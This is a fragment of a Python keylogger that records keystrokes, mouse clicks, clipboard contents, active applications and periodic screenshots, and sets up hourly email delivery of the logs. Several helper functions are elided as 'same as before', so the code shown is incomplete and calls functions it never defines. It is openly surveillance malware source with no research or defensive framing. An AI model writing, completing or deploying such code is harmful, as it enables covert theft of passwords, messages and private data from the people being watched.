from pynput import keyboard, mouse
import time
import threading
import subprocess
from PIL import ImageGrab
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import os
import win32clipboard
import re
import requests
import win32gui
import psutil

log_file = 'keystrokes_log.txt'
screenshot_folder = 'screenshots/'
email_interval = 3600  # Send email every 1 hour
screenshot_interval = 600  # Capture screenshot every 10 minutes

current_word = ""
current_line = ""
current_application = ""
screenshot_key = keyboard.Key.print_screen
clipboard_key = keyboard.Key.f9

# Email configuration
# ... (same as before)

# Function to capture clipboard
# ... (same as before)

# Function to capture screenshot
# ... (same as before)

# Function to send email
# ... (same as before)

# Function to get active application
# ... (same as before)

# Function to capture URLs
# ... (same as before)

# Function to capture window titles
# ... (same as before)

# Function to capture running processes
# ... (same as before)

# New function to log mouse clicks
def on_click(x, y, button, pressed):
    if pressed:
        with open(log_file, 'a') as f:
            f.write(f'{time.strftime("%Y-%m-%d %H:%M:%S")} - Mouse Click: Button {button} at ({x}, {y})\n')

def on_key_press(key):
    global current_word, current_line, current_application

    try:
        if key == screenshot_key:
            capture_screenshot()
        elif key == clipboard_key:
            capture_clipboard()
        elif hasattr(key, 'char'):
            current_word += key.char
            if current_application.lower() == 'chrome':
                capture_url(current_word)
        elif key == keyboard.Key.space:
            current_word += " "
        elif key == keyboard.Key.enter:
            current_word += "\n"
            current_line += current_word
            current_word = ""
    except AttributeError:
        if key == keyboard.Key.space:
            if current_word:
                current_line += current_word + " "
                current_word = ""
        elif key == keyboard.Key.enter:
            if current_word:
                current_line += current_word + "\n"
                current_word = ""
    
    if len(current_line) >= 50:
        save_current_line()

# Set up mouse listener
mouse_listener = mouse.Listener(on_click=on_click)
mouse_listener.start()

# Rest of the code remains unchanged
